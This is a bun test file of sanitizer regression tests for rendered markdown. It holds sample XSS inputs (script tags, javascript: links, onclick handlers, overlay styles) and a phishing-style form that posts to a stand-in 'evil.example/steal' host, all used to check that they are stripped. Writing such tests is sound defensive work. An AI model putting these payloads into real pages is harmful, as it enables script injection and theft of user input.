import { describe, expect, test } from "bun:test"
import { sanitizeMarkdown } from "./markdown-cache"

describe("sanitize regression", () => {
  test("script tag is stripped", () => {
    const result = sanitizeMarkdown("<script>alert(1)</script><p>hello</p>")
    expect(result).not.toContain("<script>")
    expect(result).toContain("<p>hello</p>")
  })

  test("<svg><foreignObject> is stripped", () => {
    const result = sanitizeMarkdown("<svg><foreignObject><div>bad</div></foreignObject></svg>")
    expect(result).not.toContain("<foreignObject>")
  })

  test("javascript: URL is stripped from href", () => {
    const result = sanitizeMarkdown('<a href="javascript:alert(1)">click</a>')
    expect(result).not.toContain("javascript:")
  })

  test("custom elements are stripped", () => {
    const result = sanitizeMarkdown("<evil-el onclick='alert(1)'>bad</evil-el>")
    expect(result).not.toContain("<evil-el>")
  })

  test("kb:// citation href survives sanitization (assistant citation anchors)", () => {
    const result = sanitizeMarkdown('<a href="kb://kb_123abc" class="external-link">Note title</a>')
    expect(result).toContain('href="kb://kb_123abc"')
  })

  test("unsafe javascript: URLs stay stripped while kb:// is allowed", () => {
    const result = sanitizeMarkdown('<a href="javascript:alert(1)">bad</a><a href="kb://kb_1">good</a>')
    expect(result).not.toContain("javascript:")
    expect(result).toContain('href="kb://kb_1"')
  })

  test('target="_blank" gets noopener noreferrer', () => {
    const result = sanitizeMarkdown('<a href="https://safe.com" target="_blank">link</a>')
    expect(result).toContain("noopener")
    expect(result).toContain("noreferrer")
  })

  test("normal markdown HTML is preserved", () => {
    const result = sanitizeMarkdown("<p>hello <strong>world</strong></p>")
    expect(result).toContain("<p>hello")
    expect(result).toContain("<strong>world</strong>")
    expect(result).toContain("</p>")
  })

  test("empty input returns empty", () => {
    expect(sanitizeMarkdown("")).toBe("")
  })

  // 注意 happy-dom 的一致性缺口：DOMPurify 依赖 live NodeIterator，而 happy-dom 的
  // iterator 在当前节点被 removeChild 后失效 —— 只要 payload 前面有任何元素被删除，
  // 它之后的节点就完全跳过属性消毒（onclick / javascript: / style 全部存活）。
  // 所以本文件的断言只对「payload 位于文档首位」成立，真正的消毒证据在
  // packages/app/e2e/regression/markdown-sanitize.spec.ts（真实 Chromium + 真实几何）。
  test("out-of-flow positioning is stripped while the style attribute itself survives", () => {
    const result = sanitizeMarkdown('<p style="position:fixed;inset:0;z-index:99999">OVERLAY</p>')
    expect(result).toContain("OVERLAY")
    // position 一旦移除，inset/z-index 随之失效，元素回到文档流。
    expect(result).not.toContain("position:")
    // style 整条不能禁：KaTeX 的视觉层靠内联 height/top/vertical-align 定位。
    expect(sanitizeMarkdown('<span style="height:1.04em;vertical-align:-0.34em">M</span>')).toContain("height:")
  })

  test("position:absolute and sticky are stripped the same way", () => {
    expect(sanitizeMarkdown('<p style="position:absolute;top:-9999px">A</p>')).not.toContain("position:")
    expect(sanitizeMarkdown('<p style="position:STICKY;top:0">B</p>')).not.toContain("position:")
    expect(sanitizeMarkdown('<p style="position:relative;top:2px">C</p>')).toContain("position:")
  })

  test("transform is stripped so an in-flow element cannot paint outside its box", () => {
    expect(sanitizeMarkdown('<p style="transform:scale(50)">T</p>')).not.toContain("transform")
  })

  test("form elements and their action attribute are stripped", () => {
    const result = sanitizeMarkdown(
      '<form action="https://evil.example/steal"><input type="text" name="q"><button type="submit">go</button></form>FORMPROBE',
    )
    expect(result).toContain("FORMPROBE")
    expect(result).not.toContain("<form")
    expect(result).not.toContain("action=")
    expect(result).not.toContain("<input")
    expect(result).not.toContain("<button")
  })

  // 图片保留是刻意决定：服务端 CSP 明确允许 img-src 'self' data: https:
  // （packages/aigcfroge/src/server/shared/ui.ts），timeline-playground.stories.tsx
  // 也用 ![Alt text](…) 作渲染 fixture。远程图片的信标外泄面记在
  // docs/technical-debt.md，属 CSP 收窄的独立决定，不在 sanitizer 层用禁标签解决。
  test("markdown images are preserved (remote, data: and root-relative)", () => {
    for (const src of ["https://example.com/x.png", "data:image/png;base64,iVBORw0KGgo=", "/local/file.png"]) {
      const result = sanitizeMarkdown(`<p><img src="${src}" alt="alt"></p>`)
      expect(result).toContain("<img")
      expect(result).toContain(src)
    }
  })
})
